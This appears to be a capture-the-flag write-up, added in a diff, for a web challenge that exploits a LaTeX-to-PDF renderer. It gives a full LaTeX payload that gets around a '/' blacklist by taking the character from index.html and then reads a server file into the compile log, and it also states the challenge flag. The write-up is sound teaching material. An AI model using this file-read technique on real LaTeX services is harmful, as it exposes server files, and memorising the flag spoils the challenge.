@@ -1,0 +1,62 @@
+<h1>Richard Simmons: Sweatin' in LaTeX</h1>
+
+<h3>Category: Web Exploitation</h3>
+
+<h3>Author: James Lowther (Articuler)</h3>
+
+<h2>Description</h2>
+
+<p>Richard Simmons' new workout "Sweatin' in LaTeX" is out now! See if you can shimmy your way to the flag!</p>
+
+<h2>Solution</h2>
+
+<p>The website appears to be a renderer for LaTeX code. Writing LaTex and clicking "Generate PDF" gives a link to a rendered PDf. The output LOG of the LaTeX renderer will also be displayed. </p>
+
+<ol>
+<li>Looking at the source HTML indicates that we need to read the flag from a file found in <code>/sweatin/to/the/oldies/flag.txt</code>.</li>
+<li>LaTeX is turing-complete and has the ability to read files, however, certain strings have been blacklisted. Most notably, <code>/</code> has been blacklisted making it challenging to create the path to read the file.</li>
+<li>The <code>/</code> character however can be isolated from <code>index.html</code> using the <code>\StrMid</code> function from the <code>xstring</code> package. By getting the <code>/</code> character from <code>index.html</code>, we can use it to build our path and bypass the blacklisted characters filter.</li>
+<li>Using this we can write the following LaTeX code that will build the path and read the flag:
+```
+\documentclass{minimal}</li>
+</ol>
+
+<p>% The xstring package allows us to use \StrMid
+\usepackage{xstring}</p>
+
+<p>% Define sections of the path to the flag
+\def\a{sweatin}
+\def\b{to}
+\def\c{the}
+\def\d{oldies}
+\def\e{flag.txt}</p>
+
+<p>% Read index.html and isolate the forward-s lash character into \s
+\newread\file
+\immediate\openin\file=index.html
+\immediate\read\file to\fileline
+\immediate\read\file to\fileline
+\immediate\read\file to\fileline
+\immediate\read\file to\fileline
+\StrMid{\fileline}{43}{43}[\s]
+\immediate\closein\file</p>
+
+<p>% Build the path the the flag and read it
+\immediate\openin\file=\s\a\s\b\s\c\s\d\s\e
+\loop\unless\ifeof\file
+    \read\file to\fileline
+    \message{\fileline}
+\repeat
+\closein\file</p>
+
+<p>\begin{document}
+\end{document} 
+```</p>
+
+<p>The flag can be found in the returned LOG data.</p>
+
+<h2>Flag</h2>
+
+<p>magpie{r1ch4rd<em>l0v35</em>t0_5w34t}</p>
+
+<p><em>Inspired and derived from <a href="https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code">the web90 challenge in Internetwache CTF 2016</a></em></p>
